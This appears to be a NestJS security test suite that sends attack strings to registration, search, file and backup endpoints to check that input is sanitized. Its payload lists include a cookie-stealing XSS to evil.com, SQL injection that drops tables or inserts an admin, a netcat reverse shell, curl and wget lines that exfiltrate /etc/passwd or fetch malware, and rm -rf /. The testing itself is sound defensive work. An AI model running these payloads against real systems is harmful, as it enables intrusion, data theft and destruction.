import { Test, TestingModule } from '@nestjs/testing';
import { INestApplication } from '@nestjs/common';
import  request from 'supertest';



import { AppModule } from '../../app.module';

/**
 * Input Validation Stress Testing Suite
 * Comprehensive testing of input validation and sanitization
 */
describe('Input Validation Stress Testing', () => {
  let app: INestApplication;
  let authToken: string;

  beforeAll(async () => {
    const moduleFixture: TestingModule = await Test.createTestingModule({
      imports: [AppModule],
    }).compile();

    app = moduleFixture.createNestApplication();
    await app.init();
    
    // Setup authentication token
    await setupAuthToken();
  });

  afterAll(async () => {
    await app.close();
  });

  describe('🔍 XSS Attack Vectors', () => {
    const xssPayloads = [
      // Basic XSS
      '<script>alert("XSS")</script>',
      '<img src="x" onerror="alert(1)">',
      '<svg onload="alert(1)">',
      
      // Event handlers
      '<body onload="alert(1)">',
      '<div onclick="alert(1)">Click me</div>',
      '<input type="text" onfocus="alert(1)" autofocus>',
      '<a href="javascript:alert(1)">Click</a>',
      
      // CSS-based XSS
      '<style>@import"javascript:alert(1)";</style>',
      '<link rel="stylesheet" href="javascript:alert(1)">',
      
      // Encoded XSS
      '&lt;script&gt;alert("XSS")&lt;/script&gt;',
      '%3Cscript%3Ealert("XSS")%3C/script%3E',
      
      // Unicode XSS
      '<script>alert\u0028"XSS"\u0029</script>',
      
      // Filter bypass attempts
      '"><script>alert("XSS")</script>',
      '\';alert("XSS");//',
      'javascript:alert("XSS")',
      'data:text/html,<script>alert("XSS")</script>',
      
      // Advanced XSS
      '<iframe src="javascript:alert(1)"></iframe>',
      '<object data="javascript:alert(1)">',
      '<embed src="javascript:alert(1)">',
      '<form><button formaction="javascript:alert(1)">Click</button></form>',
      
      // DOM-based XSS
      '<img src="x" onerror="document.location=\'http://evil.com/steal?cookie=\'+document.cookie">',
      '<script>eval(location.hash.substr(1))</script>',
    ];

    it('should sanitize XSS in user registration', async () => {
      for (const payload of xssPayloads) {
        const response = await request(app.getHttpServer())
          .post('/auth/register')
          .send({
            email: `test${Date.now()}@example.com`,
            password: 'TestPassword123!',
            firstName: payload,
            lastName: payload,
            bio: payload,
          });

        if (response.status === 201) {
          expect(response.body.data.user.firstName).not.toContain('<script');
          expect(response.body.data.user.firstName).not.toContain('javascript:');
          expect(response.body.data.user.firstName).not.toContain('onerror');
          expect(response.body.data.user.firstName).not.toContain('onload');
        }
      }
    });

    it('should sanitize XSS in profile updates', async () => {
      for (const payload of xssPayloads) {
        const response = await request(app.getHttpServer())
          .patch('/api/users/profile')
          .send({
            firstName: payload,
            lastName: payload,
            bio: payload,
            website: payload,
          })
          .set('Authorization', `Bearer ${authToken}`);

        if (response.status === 200) {
          const userData = response.body.data;
          expect(JSON.stringify(userData)).not.toContain('<script');
          expect(JSON.stringify(userData)).not.toContain('javascript:');
          expect(JSON.stringify(userData)).not.toContain('onerror');
        }
      }
    });

    it('should sanitize XSS in search queries', async () => {
      for (const payload of xssPayloads) {
        const response = await request(app.getHttpServer())
          .get('/api/search')
          .query({ q: payload, type: 'users' })
          .set('Authorization', `Bearer ${authToken}`);

        const responseText = JSON.stringify(response.body);
        expect(responseText).not.toContain('<script');
        expect(responseText).not.toContain('javascript:');
        expect(responseText).not.toContain('onerror');
      }
    });

    it('should sanitize XSS in comment/message content', async () => {
      for (const payload of xssPayloads) {
        const response = await request(app.getHttpServer())
          .post('/api/messages')
          .send({
            content: payload,
            title: payload,
            type: 'announcement',
          })
          .set('Authorization', `Bearer ${authToken}`);

        if (response.status === 201) {
          expect(response.body.data.content).not.toContain('<script');
          expect(response.body.data.title).not.toContain('javascript:');
        }
      }
    });
  });

  describe('💉 SQL Injection Attack Vectors', () => {
    const sqlInjectionPayloads = [
      // Basic SQL injection
      "'; DROP TABLE users; --",
      "' OR '1'='1",
      "' OR 1=1 --",
      "' UNION SELECT * FROM users --",
      
      // Advanced SQL injection
      "'; INSERT INTO users (email, role) VALUES ('hacker@evil.com', 'admin'); --",
      "'; UPDATE users SET role='admin' WHERE id=1; --",
      "' AND (SELECT COUNT(*) FROM users) > 0 --",
      "'; EXEC xp_cmdshell('dir'); --",
      
      // Time-based blind SQL injection
      "' OR SLEEP(5) --",
      "'; WAITFOR DELAY '00:00:05'; --",
      "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --",
      
      // Boolean-based blind SQL injection
      "' AND (SELECT SUBSTRING(@@version,1,1))='5' --",
      "' AND (SELECT COUNT(*) FROM information_schema.tables)>0 --",
      
      // Union-based SQL injection
      "' UNION SELECT null,username,password FROM admin --",
      "' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 --",
      
      // Error-based SQL injection
      "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e)) --",
      "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
      
      // NoSQL injection (for MongoDB)
      "'; return true; var x = '",
      "'; return this.a == this.b; var x = '",
      "$where: 'return true'",
      "{ $ne: null }",
      "{ $regex: '.*' }",
    ];

    it('should prevent SQL injection in authentication', async () => {
      for (const payload of sqlInjectionPayloads) {
        const response = await request(app.getHttpServer())
          .post('/auth/login')
          .send({
            email: payload,
            password: payload,
          });

        expect(response.status).not.toBe(200);
        expect(response.body.message).not.toContain('SQL');
        expect(response.body.message).not.toContain('syntax');
        expect(response.body.message).not.toContain('mysql');
        expect(response.body.message).not.toContain('postgres');
        expect(response.body).not.toHaveProperty('stack');
      }
    });

    it('should prevent SQL injection in user search', async () => {
      for (const payload of sqlInjectionPayloads) {
        const response = await request(app.getHttpServer())
          .get('/api/users')
          .query({ 
            search: payload,
            email: payload,
            role: payload,
          })
          .set('Authorization', `Bearer ${authToken}`);

        const responseText = JSON.stringify(response.body);
        expect(responseText).not.toContain('SQL');
        expect(responseText).not.toContain('database');
        expect(responseText).not.toContain('syntax');
        expect(response.body).not.toHaveProperty('stack');
      }
    });

    it('should prevent SQL injection in data filtering', async () => {
      for (const payload of sqlInjectionPayloads) {
        const response = await request(app.getHttpServer())
          .get('/api/courses')
          .query({
            category: payload,
            level: payload,
            instructor: payload,
            sortBy: payload,
            orderBy: payload,
          })
          .set('Authorization', `Bearer ${authToken}`);

        expect(response.body.message).not.toContain('SQL');
        expect(response.body).not.toHaveProperty('stack');
      }
    });

    it('should prevent SQL injection in user creation', async () => {
      for (const payload of sqlInjectionPayloads) {
        const response = await request(app.getHttpServer())
          .post('/api/users')
          .send({
            email: `test${Date.now()}@example.com`,
            firstName: payload,
            lastName: payload,
            role: payload,
            department: payload,
          })
          .set('Authorization', `Bearer ${authToken}`);

        if (response.status === 201) {
          // Data should be sanitized
          expect(response.body.data.firstName).not.toContain('DROP');
          expect(response.body.data.firstName).not.toContain('SELECT');
          expect(response.body.data.firstName).not.toContain('UNION');
        }
      }
    });
  });

  describe('💻 Command Injection Attack Vectors', () => {
    const commandInjectionPayloads = [
      // Basic command injection
      '; ls -la',
      '| cat /etc/passwd',
      '&& whoami',
      '|| id',
      
      // Windows command injection
      '& dir',
      '&& type C:\\windows\\system32\\drivers\\etc\\hosts',
      
      // Advanced command injection
      '; curl http://evil.com/steal.php?data=$(cat /etc/passwd)',
      '| nc evil.com 4444 -e /bin/bash',
      '; python -c "import os; os.system(\'rm -rf /\')"',
      
      // Encoded command injection
      '%3B%20ls%20-la',
      '%26%26%20whoami',
      
      // Backtick command injection
      '`whoami`',
      '$(id)',
      '${IFS}cat${IFS}/etc/passwd',
      
      // File manipulation
      '; touch /tmp/hacked',
      '| echo "hacked" > /tmp/test',
      '; rm -rf /',
      
      // Network commands
      '; wget http://evil.com/malware.sh',
      '| curl -X POST -d @/etc/passwd http://evil.com/steal',
      '; nmap -sS localhost',
    ];

    it('should prevent command injection in file operations', async () => {
      for (const payload of commandInjectionPayloads) {
        const response = await request(app.getHttpServer())
          .post('/api/files/process')
          .send({
            filename: payload,
            operation: payload,
            parameters: payload,
          })
          .set('Authorization', `Bearer ${authToken}`);

        expect(response.body.message).not.toContain('command');
        expect(response.body.message).not.toContain('executed');
        expect(response.body).not.toHaveProperty('stack');
      }
    });

    it('should prevent command injection in system operations', async () => {
      for (const payload of commandInjectionPayloads) {
        const response = await request(app.getHttpServer())
          .post('/api/system/backup')
          .send({
            path: payload,
            name: payload,
            options: payload,
          })
          .set('Authorization', `Bearer ${authToken}`);

        expect(response.body.message).not.toContain('bash');
        expect(response.body.message).not.toContain('shell');
        expect(response.body).not.toHaveProperty('stack');
      }
    });
  });

  describe('📁 Path Traversal Attack Vectors', () => {
    const pathTraversalPayloads = [
      // Basic path traversal
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      '/etc/passwd',
      'C:\\windows\\system32\\drivers\\etc\\hosts',
      
      // Encoded path traversal
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '..%252f..%252f..%252fetc%252fpasswd',
      
      // Double encoded
      '%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd',
      
      // Unicode encoded
      '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
      
      // Null byte injection
      '../../../etc/passwd%00.jpg',
      '..\\..\\..\\windows\\system32\\config\\sam%00.txt',
      
      // Mixed separators
      '..\\../..\\../etc/passwd',
      '../..\\../windows/system32/config/sam',
      
      // Absolute paths
      '/var/www/html/config.php',
      'C:\\inetpub\\wwwroot\\web.config',
      
      // Advanced techniques
      '....//....//....//etc/passwd',
      '..///////..////etc/passwd',
      '..\\\\..\\\\..\\\\windows\\system32\\config\\sam',
    ];

    it('should prevent path traversal in file downloads', async () => {
      for (const payload of pathTraversalPayloads) {
        const response = await request(app.getHttpServer())
          .get(`/api/files/download/${encodeURIComponent(payload)}`)
          .set('Authorization', `Bearer ${authToken}`);

        expect(response.status).not.toBe(200);
        expect(response.body.message).not.toContain('/etc/passwd');
        expect(response.body.message).not.toContain('system32');
      }
    });

    it('should prevent path traversal in file uploads', async () => {
      for (const payload of pathTraversalPayloads) {
        const response = await request(app.getHttpServer())
          .post('/api/files/upload')
          .field('path', payload)
          .field('filename', payload)
          .attach('file', Buffer.from('test content'), payload)
          .set('Authorization', `Bearer ${authToken}`);

        expect(response.status).not.toBe(200);
      }
    });

    it('should prevent path traversal in template rendering', async () => {
      for (const payload of pathTraversalPayloads) {
        const response = await request(app.getHttpServer())
          .post('/api/templates/render')
          .send({
            template: payload,
            include: payload,
            extends: payload,
          })
          .set('Authorization', `Bearer ${authToken}`);

        expect(response.body.message).not.toContain('/etc/passwd');
        expect(response.body.message).not.toContain('system32');
      }
    });
  });

  describe('🔢 Input Size and Format Testing', () => {
    it('should handle extremely large strings', async () => {
      const largeString = 'A'.repeat(1000000); // 1MB string
      
      const response = await request(app.getHttpServer())
        .patch('/api/users/profile')
        .send({
          bio: largeString,
          firstName: largeString,
        })
        .set('Authorization', `Bearer ${authToken}`);

      expect(response.status).toBe(413); // Payload too large
      expect(response.body.message).toContain('too large');
    });

    it('should handle deeply nested objects', async () => {
      let deepObject: any = {};
      let current = deepObject;
      
      // Create 100 levels of nesting
      for (let i = 0; i < 100; i++) {
        current.nested = {};
        current = current.nested;
      }
      current.value = 'deep';

      const response = await request(app.getHttpServer())
        .post('/api/data/process')
        .send({ data: deepObject })
        .set('Authorization', `Bearer ${authToken}`);

      expect(response.status).toBe(400);
      expect(response.body.message).toContain('deeply nested');
    });

    it('should handle objects with many properties', async () => {
      const manyPropsObject: any = {};
      
      // Create object with 1000 properties
      for (let i = 0; i < 1000; i++) {
        manyPropsObject[`prop${i}`] = `value${i}`;
      }

      const response = await request(app.getHttpServer())
        .post('/api/data/process')
        .send(manyPropsObject)
        .set('Authorization', `Bearer ${authToken}`);

      expect(response.status).toBe(400);
      expect(response.body.message).toContain('too many properties');
    });

    it('should handle invalid JSON', async () => {
      const invalidJsonStrings = [
        '{"invalid": json}',
        '{invalid: "json"}',
        '{"unclosed": "string}',
        '{trailing: "comma",}',
        '{"duplicate": "key", "duplicate": "key"}',
      ];

      for (const invalidJson of invalidJsonStrings) {
        const response = await request(app.getHttpServer())
          .post('/api/data/process')
          .set('Content-Type', 'application/json')
          .send(invalidJson)
          .set('Authorization', `Bearer ${authToken}`);

        expect(response.status).toBe(400);
        expect(response.body.message).not.toContain('JSON');
        expect(response.body.message).not.toContain('parse');
      }
    });
  });

  describe('🎭 Special Characters and Encoding', () => {
    const specialCharacterPayloads = [
      // Unicode characters
      '🚀💻🔒🛡️',
      '测试数据',
      'тест данные',
      'テストデータ',
      
      // Control characters
      '\x00\x01\x02\x03\x04\x05',
      '\r\n\t\b\f',
      
      // Zero-width characters
      '\u200B\u200C\u200D\uFEFF',
      
      // Bidirectional override
      '\u202E\u202D',
      
      // Homograph attacks
      'аdmin', // Cyrillic 'a'
      'аdmіn', // Cyrillic 'a' and 'i'
      
      // Normalization attacks
      'café', // é as single character
      'cafe\u0301', // é as e + combining acute accent
    ];

    it('should handle special characters in user input', async () => {
      for (const payload of specialCharacterPayloads) {
        const response = await request(app.getHttpServer())
          .patch('/api/users/profile')
          .send({
            firstName: payload,
            lastName: payload,
          })
          .set('Authorization', `Bearer ${authToken}`);

        if (response.status === 200) {
          // Should handle gracefully without errors
          expect(response.body.data.firstName).toBeDefined();
        }
      }
    });

    it('should normalize Unicode input', async () => {
      const response = await request(app.getHttpServer())
        .patch('/api/users/profile')
        .send({
          firstName: 'cafe\u0301', // é as e + combining accent
        })
        .set('Authorization', `Bearer ${authToken}`);

      if (response.status === 200) {
        // Should normalize to single character form
        expect(response.body.data.firstName).toBe('café');
      }
    });

    it('should detect homograph attacks', async () => {
      const response = await request(app.getHttpServer())
        .post('/auth/register')
        .send({
          email: 'аdmin@example.com', // Cyrillic 'a'
          password: 'TestPassword123!',
          firstName: 'Admin',
          lastName: 'User',
        });

      // Should detect and prevent homograph attack
      expect(response.status).toBe(400);
      expect(response.body.message).toContain('invalid');
    });
  });

  describe('🔐 Authentication Input Validation', () => {
    it('should validate email format strictly', async () => {
      const invalidEmails = [
        'invalid-email',
        '@domain.com',
        'user@',
        'user..double.dot@domain.com',
        'user@domain',
        'user@domain..com',
        'user name@domain.com',
        'user@domain.com.',
        '.user@domain.com',
      ];

      for (const email of invalidEmails) {
        const response = await request(app.getHttpServer())
          .post('/auth/register')
          .send({
            email,
            password: 'TestPassword123!',
            firstName: 'Test',
            lastName: 'User',
          });

        expect(response.status).toBe(400);
        expect(response.body.message).toContain('email');
      }
    });

    it('should enforce password complexity', async () => {
      const weakPasswords = [
        'password',
        '123456',
        'qwerty',
        'Password',
        'password123',
        'Password123',
        'short',
        'verylongpasswordwithoutspecialcharacters',
      ];

      for (const password of weakPasswords) {
        const response = await request(app.getHttpServer())
          .post('/auth/register')
          .send({
            email: `test${Date.now()}@example.com`,
            password,
            firstName: 'Test',
            lastName: 'User',
          });

        expect(response.status).toBe(400);
        expect(response.body.message).toContain('password');
      }
    });

    it('should prevent password enumeration', async () => {
      const response1 = await request(app.getHttpServer())
        .post('/auth/forgot-password')
        .send({ email: 'existing@example.com' });

      const response2 = await request(app.getHttpServer())
        .post('/auth/forgot-password')
        .send({ email: 'nonexisting@example.com' });

      // Responses should be similar to prevent enumeration
      expect(response1.status).toBe(response2.status);
      expect(response1.body.message).toBe(response2.body.message);
    });
  });

  // Helper function to setup authentication token
  async function setupAuthToken() {
    const response = await request(app.getHttpServer())
      .post('/auth/register')
      .send({
        email: `testuser${Date.now()}@example.com`,
        password: 'TestPassword123!',
        firstName: 'Test',
        lastName: 'User',
      });

    if (response.status === 201) {
      authToken = response.body.data.tokens.access;
    }
  }
});
